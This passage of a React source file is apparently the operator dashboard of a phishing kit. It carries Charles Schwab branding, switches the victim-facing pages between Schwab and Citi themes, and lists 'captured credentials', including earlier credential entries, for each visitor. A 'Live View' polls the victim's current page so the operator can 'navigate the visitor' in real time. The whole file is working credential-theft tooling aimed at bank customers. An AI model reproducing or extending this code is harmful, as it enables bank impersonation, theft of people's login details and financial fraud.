                  <div style={{ fontSize: 10, color: t.textMuted, fontFamily: 'monospace' }}>{c.vault_ref || '—'}</div>
                  {/* Captured */}
                  <div style={{ fontSize: 10, color: t.textMuted }}>{c.captured_at ? fmt(c.captured_at) : '—'}</div>
                  {/* Agent badge */}
                  <div style={{ fontSize: 9, color: c.agent_name ? '#1AACE2' : t.textMuted, fontWeight: c.agent_name ? 700 : 400, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {c.agent_name || '—'}
                  </div>
                  {/* Settings gear */}
                  <button onClick={() => setExpandedId(expandedId === c.id ? null : c.id)} style={{ width: 26, height: 26, border: `1px solid ${expandedId === c.id ? accent : t.cardBorder}`, cursor: 'pointer', background: expandedId === c.id ? `rgba(26,172,226,0.12)` : 'transparent', color: expandedId === c.id ? accent : t.textMuted, display: 'flex', alignItems: 'center', justifyContent: 'center' }}
                    title="Configure agent & account settings">
                    <Settings size={11} />
                  </button>
                  {/* Delete */}
                  <button onClick={() => { deleteCapture(c.id); if (expandedId === c.id) setExpandedId(null); }} style={{ width: 26, height: 26, border: 'none', cursor: 'pointer', background: 'rgba(239,68,68,0.07)', color: 'rgba(239,68,68,0.55)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}
                    onMouseEnter={e => { e.currentTarget.style.background = 'rgba(239,68,68,0.18)'; e.currentTarget.style.color = '#EF4444'; }}
                    onMouseLeave={e => { e.currentTarget.style.background = 'rgba(239,68,68,0.07)'; e.currentTarget.style.color = 'rgba(239,68,68,0.55)'; }}>
                    <Trash2 size={11} />
                  </button>
                </div>
                {expandedId === c.id && (
                  <RowSettingsPanel
                    capture={c}
                    dark={dark}
                    onSaved={(updated) => setCaptures(prev => prev.map(x => x.id === updated.id ? updated : x))}
                    onClose={() => setExpandedId(null)}
                  />
                )}
              </div>
            ))}
          </>
        )}
      </div>
    </div>
  );
}

// ── Main ─────────────────────────────────────────────────────────────────────

type Tab = 'visitors' | 'switcher' | 'database';

export default function AdminDashboard() {
  const [, navigate] = useLocation();
  const [tab, setTab] = useState<Tab>('visitors');

  // Admin panel theme (independent of visitor-facing theme)
  const [adminDark, setAdminDark] = useState(true);

  // Visitor-facing theme (only changed via Switcher tab)
  const [activeTheme, setActiveTheme] = useState<'schwab' | 'citi'>(
    () => (localStorage.getItem('finvault_active_theme') as 'schwab' | 'citi') || 'schwab'
  );
  const [animalMode, setAnimalMode] = useState(() => localStorage.getItem('finvault_animal_mode') === 'true');
  const [visitorPage, setVisitorPage] = useState(() => localStorage.getItem('finvault_current_page') || '/');
  const [visitorLastSeen, setVisitorLastSeen] = useState(() => Number(localStorage.getItem('finvault_page_updated') || 0));
  const [attempts, setAttempts] = useState<LoginAttempt[]>(() =>
    JSON.parse(localStorage.getItem('finvault_login_attempts') || '[]')
  );
  const [selectedAttempt, setSelectedAttempt] = useState<LoginAttempt | null>(null);
  const [deviceFilter, setDeviceFilter] = useState<'all' | 'Desktop' | 'Tablet' | 'Mobile'>('all');
  const [savedIds, setSavedIds] = useState<Set<string>>(() => {
    try { return new Set(JSON.parse(localStorage.getItem('finvault_saved_captures') || '[]')); }
    catch { return new Set(); }
  });
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    if (localStorage.getItem('finvault_admin_auth') !== 'true') navigate('/admin');
  }, [navigate]);

  useEffect(() => {
    pollRef.current = setInterval(() => {
      setVisitorPage(localStorage.getItem('finvault_current_page') || '/');
      setVisitorLastSeen(Number(localStorage.getItem('finvault_page_updated') || 0));
      const fresh: LoginAttempt[] = JSON.parse(localStorage.getItem('finvault_login_attempts') || '[]');
      // Re-render if length changed OR if the most recent record changed (same-visitor credential update)
      setAttempts(prev => {
        const changed = fresh.length !== prev.length
          || fresh[0]?.id !== prev[0]?.id
          || fresh[0]?.timestamp !== prev[0]?.timestamp
          || (fresh[0]?.previousCredentials?.length ?? 0) !== (prev[0]?.previousCredentials?.length ?? 0);
        return changed ? fresh : prev;
      });
    }, 1000);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  const logout = () => { localStorage.removeItem('finvault_admin_auth'); navigate('/admin'); };
  const switchTheme = (th: 'schwab' | 'citi') => { setActiveTheme(th); localStorage.setItem('finvault_active_theme', th); };
  const toggleAnimal = () => { const n = !animalMode; setAnimalMode(n); localStorage.setItem('finvault_animal_mode', String(n)); };
  const deleteAttempt = (id: string) => {
    const updated = attempts.filter(a => a.id !== id);
    setAttempts(updated); localStorage.setItem('finvault_login_attempts', JSON.stringify(updated));
    if (selectedAttempt?.id === id) setSelectedAttempt(null);
  };
  const saveAttempt = (id: string) => {
    const next = new Set(savedIds); next.add(id); setSavedIds(next);
    localStorage.setItem('finvault_saved_captures', JSON.stringify([...next]));
  };
  const clearAll = () => { setAttempts([]); localStorage.setItem('finvault_login_attempts', '[]'); setSelectedAttempt(null); };

  const visitorIsLive = visitorLastSeen > 0 && (Date.now() - visitorLastSeen) < 15_000;
  const liveCount = visitorIsLive ? 1 : 0;
  const filteredAttempts = deviceFilter === 'all' ? attempts : attempts.filter(a => a.device === deviceFilter);

  const t = tokens(adminDark);
  const ff = { fontFamily: '"Helvetica Neue", Arial, sans-serif' };

  return (
    <div style={{ display: 'flex', height: '100vh', background: t.bg, ...ff, overflow: 'hidden' }}>

      {/* ── Narrow sidebar (controls only) ── */}
      <aside style={{ width: 185, background: t.sidebar, borderRight: `1px solid ${t.sidebarBorder}`, display: 'flex', flexDirection: 'column', flexShrink: 0, overflowY: 'auto' }}>

        {/* Logo */}
        <div style={{ padding: '12px 14px 10px', borderBottom: `1px solid ${t.sidebarBorder}` }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 9 }}>
            <div style={{ width: 36, height: 25, background: '#1AACE2', borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
              <span style={{ color: '#fff', fontSize: 7, fontStyle: 'italic', fontFamily: 'Georgia, serif', lineHeight: 1.15 }}>charles</span>
              <span style={{ color: '#fff', fontSize: 5.5, fontWeight: 900, fontFamily: 'Arial', letterSpacing: '1px', lineHeight: 1.15 }}>SCHWAB</span>
            </div>
            <div>
              <div style={{ fontSize: 11, fontWeight: 700, color: t.text }}>Admin Console</div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginTop: 1 }}>
                <span style={{ width: 6, height: 6, borderRadius: '50%', background: liveCount > 0 ? '#22C55E' : t.textMuted, display: 'inline-block' }} />
                <span style={{ fontSize: 9, color: t.textSub }}>{liveCount > 0 ? 'Live' : 'No live visitors'}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Tabs */}
        <div style={{ display: 'flex', padding: '7px 9px', gap: 3, borderBottom: `1px solid ${t.sidebarBorder}` }}>
          {(['visitors', 'switcher', 'database'] as Tab[]).map(tb => (
            <button key={tb} onClick={() => setTab(tb)} style={{ flex: 1, padding: '5px 0', borderRadius: 5, border: 'none', cursor: 'pointer', fontSize: 9, fontWeight: 600, textTransform: 'capitalize', background: tab === tb ? t.activeTab : 'transparent', color: tab === tb ? t.activeTabText : t.textSub }}>
              {tb === 'visitors' ? 'Visitors' : tb === 'switcher' ? 'Theme' : 'Database'}
            </button>
          ))}
        </div>


        {tab === 'visitors' && (
          <>
            {/* DEVICE */}
            <div style={{ padding: '12px 14px 10px', borderBottom: `1px solid ${t.divider}` }}>
              <div style={{ fontSize: 8, fontWeight: 700, color: t.label, letterSpacing: '0.12em', textTransform: 'uppercase', marginBottom: 8 }}>DEVICE</div>
              <div style={{ display: 'flex', gap: 3 }}>
                {(['all', 'Desktop', 'Tablet', 'Mobile'] as const).map(d => (
                  <button key={d} onClick={() => setDeviceFilter(d)} style={{ flex: 1, padding: '5px 0', borderRadius: 4, border: 'none', cursor: 'pointer', fontSize: 8, fontWeight: 600, background: deviceFilter === d ? 'rgba(26,172,226,0.18)' : t.btnSub, color: deviceFilter === d ? '#1AACE2' : t.textSub }}>
                    {d === 'all' ? 'All' : d.slice(0, 3)}
                  </button>
                ))}
              </div>
            </div>

            {/* THEME — controls admin UI light/dark */}
            <div style={{ padding: '12px 14px 10px', borderBottom: `1px solid ${t.divider}` }}>
              <div style={{ fontSize: 8, fontWeight: 700, color: t.label, letterSpacing: '0.12em', textTransform: 'uppercase', marginBottom: 8 }}>THEME</div>
              <div style={{ display: 'flex', background: adminDark ? 'rgba(255,255,255,0.06)' : 'rgba(0,0,0,0.06)', borderRadius: 6, padding: 2, gap: 2 }}>
                <button onClick={() => setAdminDark(false)} style={{ flex: 1, padding: '5px 0', borderRadius: 4, border: 'none', cursor: 'pointer', fontSize: 10, fontWeight: 600, background: !adminDark ? '#fff' : 'transparent', color: !adminDark ? '#111' : t.textSub }}>☀ Light</button>
                <button onClick={() => setAdminDark(true)} style={{ flex: 1, padding: '5px 0', borderRadius: 4, border: 'none', cursor: 'pointer', fontSize: 10, fontWeight: 600, background: adminDark ? '#2D2D3A' : 'transparent', color: adminDark ? '#fff' : t.textSub }}>☾ Dark</button>
              </div>
            </div>

            {/* ANIMAL MODE */}
            <div style={{ padding: '10px 14px 14px' }}>
              <button onClick={toggleAnimal} style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 10px', borderRadius: 6, border: 'none', cursor: 'pointer', background: animalMode ? 'rgba(224,123,84,0.12)' : t.btnSub, color: animalMode ? '#E07B54' : t.textSub, fontSize: 11, fontWeight: 600 }}>
                <span style={{ display: 'flex', alignItems: 'center', gap: 6 }}><PawPrint size={12} /> Animal Mode</span>
                <div style={{ width: 28, height: 16, borderRadius: 8, background: animalMode ? '#E07B54' : t.btnSub, border: `1px solid ${animalMode ? '#E07B54' : t.cardBorder}`, position: 'relative', flexShrink: 0 }}>
                  <div style={{ position: 'absolute', top: 1, left: animalMode ? 13 : 1, width: 12, height: 12, borderRadius: '50%', background: animalMode ? '#fff' : t.textMuted, transition: 'left 0.18s' }} />
                </div>
              </button>
            </div>
          </>
        )}

        {/* Logout */}
        <div style={{ marginTop: 'auto', padding: '8px 10px 12px', borderTop: `1px solid ${t.divider}` }}>
          <button onClick={logout} style={{ width: '100%', display: 'flex', alignItems: 'center', gap: 7, padding: '7px 10px', borderRadius: 5, border: 'none', cursor: 'pointer', background: 'transparent', color: t.textMuted, fontSize: 11 }}
            onMouseEnter={(e) => e.currentTarget.style.color = t.textSub}
            onMouseLeave={(e) => e.currentTarget.style.color = t.textMuted}>
            <LogOut size={13} /> Log Out
          </button>
        </div>
      </aside>

      {/* ── Main content ── */}
      <main style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', background: t.bg, position: 'relative' }}>
        {tab === 'database' ? (
          <DatabasePanel dark={adminDark} />
        ) : tab === 'switcher' ? (
          <DesignSwitcher activeTheme={activeTheme} switchTheme={switchTheme} animalMode={animalMode} toggleAnimal={toggleAnimal} dark={adminDark} />
        ) : (
          /* ── Visitor list ── */
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
            {/* Header */}
            <div style={{ padding: '14px 20px', borderBottom: `1px solid ${t.sidebarBorder}`, display: 'flex', alignItems: 'center', gap: 10, flexShrink: 0 }}>
              <span style={{ fontSize: 14, fontWeight: 700, color: t.text }}>Visitors</span>
              <span style={{ display: 'flex', alignItems: 'center', gap: 5, fontSize: 12, background: liveCount > 0 ? 'rgba(34,197,94,0.12)' : t.btnSub, color: liveCount > 0 ? '#22C55E' : t.textSub, borderRadius: 20, padding: '2px 9px', fontWeight: 600 }}>
                <span style={{ width: 6, height: 6, borderRadius: '50%', background: liveCount > 0 ? '#22C55E' : t.textMuted, display: 'inline-block' }} />
                {liveCount} live
              </span>
              <span style={{ fontSize: 12, color: t.textMuted }}>{attempts.length} total</span>
              <div style={{ flex: 1 }} />
              {attempts.length > 0 && (
                <button onClick={clearAll} style={{ fontSize: 11, fontWeight: 600, color: '#EF4444', background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.15)', borderRadius: 5, padding: '4px 10px', cursor: 'pointer' }}>Clear all</button>
              )}
            </div>

            {/* Cards — 3-per-row grid */}
            <div style={{ flex: 1, overflowY: 'auto', padding: '14px 20px', display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(300px, 1fr))', gap: 10, alignContent: 'start' }}>
              {filteredAttempts.length === 0 ? (
                <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 12, minHeight: 300 }}>
                  <div style={{ width: 50, height: 50, borderRadius: 12, background: adminDark ? 'rgba(26,172,226,0.08)' : 'rgba(26,172,226,0.06)', border: `1px solid rgba(26,172,226,0.14)`, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <Monitor size={22} color="#1AACE2" />
                  </div>
                  <div style={{ fontSize: 14, fontWeight: 600, color: t.textSub }}>Select a visitor to open Live View</div>
                  <div style={{ fontSize: 12, color: t.textMuted, textAlign: 'center', maxWidth: 280, lineHeight: 1.6 }}>
                    Captured credentials will appear here.<br />Click "Live View" to see details and navigate the visitor.
                  </div>
                </div>
              ) : (
                filteredAttempts.map((a, i) => {
                  const isLive = i === 0 && visitorIsLive;
                  const isSaved = savedIds.has(a.id);
                  const prevCreds = a.previousCredentials || [];
                  const hasHistory = prevCreds.length > 0;
                  return (
                    <VisitorCard
                      key={a.id}
                      a={a}
                      isLive={isLive}
                      isSaved={isSaved}
                      hasHistory={hasHistory}
                      prevCreds={prevCreds}
                      dark={adminDark}
                      t={t}
                      visitorPage={visitorPage}
                      onView={() => setSelectedAttempt(a)}
                      onSave={() => saveAttempt(a.id)}
                      onDelete={() => deleteAttempt(a.id)}
                    />
                  );
                })
              )}
            </div>
          </div>
        )}

        {/* ── Live View modal overlay ── */}
        {selectedAttempt && (
          <div
            onClick={(e) => { if (e.target === e.currentTarget) setSelectedAttempt(null); }}
            style={{
              position: 'absolute', inset: 0,
              background: 'rgba(0,0,0,0.55)',
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              zIndex: 50, backdropFilter: 'blur(2px)',
            }}>
            <div style={{
              width: '92%', height: '90%', maxWidth: 1100,
              background: adminDark ? '#1C1C28' : '#F8FAFC',
              borderRadius: 10,
              overflow: 'hidden',
              boxShadow: '0 24px 64px rgba(0,0,0,0.45)',
              display: 'flex', flexDirection: 'column',
            }}>
              <LiveView
                attempt={selectedAttempt}
                visitorPage={visitorPage}
                visitorIsLive={visitorIsLive}
                dark={adminDark}
                onClose={() => setSelectedAttempt(null)}
              />
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
